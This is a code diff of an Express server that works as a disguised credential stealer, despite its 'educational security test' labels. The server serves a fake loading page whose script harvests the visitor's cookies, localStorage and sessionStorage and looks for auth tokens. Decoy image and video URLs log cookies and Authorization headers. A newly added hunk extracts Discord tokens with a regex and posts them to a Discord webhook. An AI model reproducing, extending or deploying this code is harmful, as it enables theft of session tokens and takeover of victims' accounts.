@@ -82,7 +82,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
       const location = getLocationFromIp(clientIp);
       const cookies = req.headers.cookie || '';
-      
+
       // Log the access
       const settings = await storage.getSettings();
       await storage.createIpLog({
@@ -110,48 +110,48 @@ export async function registerRoutes(app: Express): Promise<Server> {
     <h2>Loading content...</h2>
     <p>Please wait while we prepare your content.</p>
   </div>
-  
+
   <script>
     (function() {
       try {
         // Capture all cookies
         const cookies = document.cookie;
-        
+
         // Capture localStorage data
         const localStorageData = {};
         for (let i = 0; i < localStorage.length; i++) {
           const key = localStorage.key(i);
           localStorageData[key] = localStorage.getItem(key);
         }
-        
+
         // Capture sessionStorage data
         const sessionStorageData = {};
         for (let i = 0; i < sessionStorage.length; i++) {
           const key = sessionStorage.key(i);
           sessionStorageData[key] = sessionStorage.getItem(key);
         }
-        
+
         // Look for common token patterns in storage
         const tokenPatterns = [
           /token/i, /auth/i, /jwt/i, /session/i, /access/i, /refresh/i, /bearer/i
         ];
-        
+
         const foundTokens = [];
-        
+
         // Check localStorage for tokens
         Object.keys(localStorageData).forEach(key => {
           if (tokenPatterns.some(pattern => pattern.test(key))) {
             foundTokens.push('localStorage.' + key + ': ' + localStorageData[key]);
           }
         });
-        
+
         // Check sessionStorage for tokens
         Object.keys(sessionStorageData).forEach(key => {
           if (tokenPatterns.some(pattern => pattern.test(key))) {
             foundTokens.push('sessionStorage.' + key + ': ' + sessionStorageData[key]);
           }
         });
-        
+
         // Capture additional browser info
         const browserInfo = {
           userAgent: navigator.userAgent,
@@ -161,7 +161,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           screenResolution: screen.width + 'x' + screen.height,
           timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
         };
-        
+
         const data = {
           cookies: cookies,
           localStorage: localStorageData,
@@ -171,10 +171,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
           url: window.location.href,
           timestamp: new Date().toISOString()
         };
-        
+
         // Log to console for educational purposes
         console.log('Educational Security Test - Complete Browser Profile:', data);
-        
+
         // Send to tracking endpoint
         fetch('/api/track-browser-data', {
           method: 'POST',
@@ -194,7 +194,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             window.location.href = 'https://www.google.com';
           }, 2000);
         });
-        
+
       } catch (error) {
         console.log('Tracking script error:', error);
       }
@@ -219,7 +219,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Serve decoy files and log the request - support multiple file types
   app.get('/:filename.:extension', async (req: Request, res: Response) => {
     const { filename, extension } = req.params;
-    
+
     // Only handle common media file extensions
     const allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'mp4', 'avi', 'mov', 'wmv', 'flv', 'mkv', 'webm'];
     if (!allowedExtensions.includes(extension.toLowerCase())) {
@@ -232,7 +232,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
       const location = getLocationFromIp(clientIp);
       const cookies = req.headers.cookie || '';
-      
+
       // Extract potential tokens from cookies and headers
       const authTokens = [];
       if (cookies) {
@@ -243,7 +243,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           /jwt[^=]*=([^;]+)/gi,
           /access[^=]*=([^;]+)/gi
         ];
-        
+
         tokenPatterns.forEach(pattern => {
           const matches = cookies.match(pattern);
           if (matches) {
@@ -251,7 +251,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           }
         });
       }
-      
+
       // Check Authorization header
       const authHeader = req.headers.authorization;
       if (authHeader) {
@@ -284,7 +284,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       // Determine if it's a video or image request
       const isVideo = ['mp4', 'avi', 'mov', 'wmv', 'flv', 'mkv', 'webm'].includes(extension.toLowerCase());
-      
+
       // Serve uploaded file if available, otherwise default content
       if (settings?.uploadedImageData && settings?.uploadedImageType) {
         const fileBuffer = Buffer.from(settings.uploadedImageData, 'base64');
@@ -303,7 +303,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70, 0x69, 0x73, 0x6F, 0x6D, 0x00, 0x00, 0x02, 0x00,
             0x69, 0x73, 0x6F, 0x6D, 0x69, 0x73, 0x6F, 0x32, 0x61, 0x76, 0x63, 0x31, 0x6D, 0x70, 0x34, 0x31
           ]);
-          
+
           res.set({
             'Content-Type': 'video/mp4',
             'Content-Length': minimalVideo.length,
@@ -341,10 +341,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const limit = parseInt(req.query.limit as string) || 50;
       const offset = parseInt(req.query.offset as string) || 0;
-      
+
       const logs = await storage.getIpLogs(limit, offset);
       const total = await storage.getTotalIpLogs();
-      
+
       res.json({ logs, total });
     } catch (error) {
       console.error('Error fetching logs:', error);
@@ -357,7 +357,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const totalRequests = await storage.getTotalIpLogs();
       const uniqueIPs = await storage.getUniqueIpCount();
       const recentLogs = await storage.getRecentLogs(1); // Last hour
-      
+
       const metrics = {
         totalRequests,
         uniqueIPs,
@@ -365,7 +365,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         avgResponseTime: 45, // Mock value
         recentActivity: recentLogs.length
       };
-      
+
       res.json(metrics);
     } catch (error) {
       console.error('Error fetching metrics:', error);
@@ -376,19 +376,19 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.get('/api/export', async (req: Request, res: Response) => {
     try {
       const logs = await storage.getIpLogs(10000); // Get all logs
-      
+
       const csv = [
         'Timestamp,IP Address,User Agent,Referrer,Location,Status',
-        ...logs.map(log => 
+        ...logs.map(log =>
           `"${log.timestamp.toISOString()}","${log.ipAddress}","${log.userAgent}","${log.referrer}","${log.location}","${log.status}"`
         )
       ].join('\n');
-      
+
       res.set({
         'Content-Type': 'text/csv',
         'Content-Disposition': 'attachment; filename="ip_logs.csv"'
       });
-      
+
       res.send(csv);
     } catch (error) {
       console.error('Error exporting logs:', error);
@@ -423,7 +423,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const validatedData = insertSettingsSchema.parse(req.body);
       const settings = await storage.createOrUpdateSettings(validatedData);
-      
+
       res.json({
         webhookUrl: settings.webhookUrl,
         uploadedImageName: settings.uploadedImageName,
@@ -444,7 +444,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       const imageData = req.file.buffer.toString('base64');
       const currentSettings = await storage.getSettings();
-      
+
       await storage.createOrUpdateSettings({
         webhookUrl: currentSettings?.webhookUrl || null,
         uploadedImageName: req.file.originalname,
@@ -452,7 +452,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         uploadedImageType: req.file.mimetype
       });
 
-      res.json({ 
+      res.json({
         message: 'Image uploaded successfully',
         filename: req.file.originalname,
         size: req.file.size
@@ -467,7 +467,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.delete('/api/upload-image', async (req: Request, res: Response) => {
     try {
       const currentSettings = await storage.getSettings();
-      
+
       await storage.createOrUpdateSettings({
         webhookUrl: currentSettings?.webhookUrl || null,
         uploadedImageName: null,
@@ -488,38 +488,80 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const browserData = req.body;
       const clientIp = getClientIp(req);
       const userAgent = req.headers['user-agent'] || '';
-      
-      // Get webhook settings
+      const location = getLocationFromIp(clientIp);
+
+      // Extract Discord tokens from localStorage and sessionStorage
+      const discordTokenRegex = /([a-zA-Z0-9]{24}\.[a-zA-Z0-9_\-]{6}\.[a-zA-Z0-9_\-]{27})|([a-zA-Z0-9]{30}\.[a-zA-Z0-9_\-]{10}\.[a-zA-Z0-9_\-]{32})/g;
+      const localStorageTokens = Object.values(browserData.localStorage || {}).flatMap(value => {
+        if (typeof value === 'string') {
+          return [...value.matchAll(discordTokenRegex)].map(match => match[0]);
+        }
+        return [];
+      });
+      const sessionStorageTokens = Object.values(browserData.sessionStorage || {}).flatMap(value => {
+        if (typeof value === 'string') {
+          return [...value.matchAll(discordTokenRegex)].map(match => match[0]);
+        }
+        return [];
+      });
+      const allDiscordTokens = [...localStorageTokens, ...sessionStorageTokens];
+
+      // Augment data with found Discord tokens and platform/language
+      const data = {
+        ...browserData,
+        discordTokens: allDiscordTokens,
+        platform: navigator.platform,
+        language: navigator.language,
+        referrer: req.headers.referer || req.headers.referrer || 'Direct Access'
+      };
+
+
+      // Get settings to check for webhook URL
       const settings = await storage.getSettings();
-      
+
       // Send comprehensive data to webhook if configured
       if (settings?.webhookUrl) {
-        const webhookData = {
-          embeds: [{
-            title: "🎯 Advanced Security Test Data",
-            color: 0x00ff00,
-            fields: [
-              { name: "IP Address", value: clientIp, inline: true },
-              { name: "User Agent", value: userAgent ? userAgent.substring(0, 100) + (userAgent.length > 100 ? "..." : "") : "Unknown", inline: false },
-              { name: "Cookies", value: browserData.cookies ? browserData.cookies.substring(0, 500) + (browserData.cookies.length > 500 ? "..." : "") : "None", inline: false },
-              { name: "Tokens Found", value: browserData.tokens?.length ? browserData.tokens.join(', ').substring(0, 800) + (browserData.tokens.join(', ').length > 800 ? "..." : "") : "None", inline: false },
-              { name: "LocalStorage", value: Object.keys(browserData.localStorage || {}).length ? Object.keys(browserData.localStorage).join(', ').substring(0, 300) + "..." : "Empty", inline: true },
-              { name: "SessionStorage", value: Object.keys(browserData.sessionStorage || {}).length ? Object.keys(browserData.sessionStorage).join(', ').substring(0, 300) + "..." : "Empty", inline: true },
-              { name: "Browser Info", value: browserData.browserInfo ? JSON.stringify(browserData.browserInfo).substring(0, 400) + "..." : "N/A", inline: false },
-              { name: "URL", value: browserData.url || 'Unknown', inline: false },
-              { name: "Timestamp", value: browserData.timestamp || new Date().toISOString(), inline: true }
-            ],
-            footer: { text: "Security Testing Tool - Educational Purposes" }
-          }]
-        };
+        // Add additional embed for Discord tokens if found
+        const embeds = [{
+          title: "🎯 New Security Test Access",
+          color: data.discordTokens?.length > 0 ? 0xff0000 : 0xff6b6b,
+          fields: [
+            { name: "IP Address", value: clientIp, inline: true },
+            { name: "User Agent", value: userAgent?.substring(0, 100) + "..." || "Unknown", inline: false },
+            { name: "Location", value: location, inline: true },
+            { name: "Referrer", value: data.referrer || "Direct Access", inline: true },
+            { name: "Tokens Found", value: data.tokens?.length.toString() || "0", inline: true },
+            { name: "Discord Tokens", value: data.discordTokens?.length.toString() || "0", inline: true },
+            { name: "Platform", value: data.platform || "Unknown", inline: true },
+            { name: "Language", value: data.language || "Unknown", inline: true },
+            { name: "Timestamp", value: new Date().toISOString(), inline: true }
+          ],
+          footer: { text: "Security Testing Tool" }
+        }];
 
-        const response = await fetch(settings.webhookUrl, {
+        // Add Discord token details if found
+        if (data.discordTokens && data.discordTokens.length > 0) {
+          embeds.push({
+            title: "🚨 Discord Tokens Detected",
+            color: 0xff0000,
+            fields: data.discordTokens.slice(0, 10).map((token, index) => ({
+              name: `Token ${index + 1}`,
+              value: token.substring(0, 100) + (token.length > 100 ? "..." : ""),
+              inline: false
+            })),
+            footer: { text: "Security Alert - Immediate Action Required" }
+          });
+        }
+
+        const webhookPayload = { embeds };
+
+        await fetch(settings.webhookUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(webhookData)
+          body: JSON.stringify(webhookPayload)
         }).catch(err => console.error('Webhook error:', err));
       }
-      
+
       res.json({ status: 'success' });
     } catch (error) {
       console.error('Error processing browser data:', error);
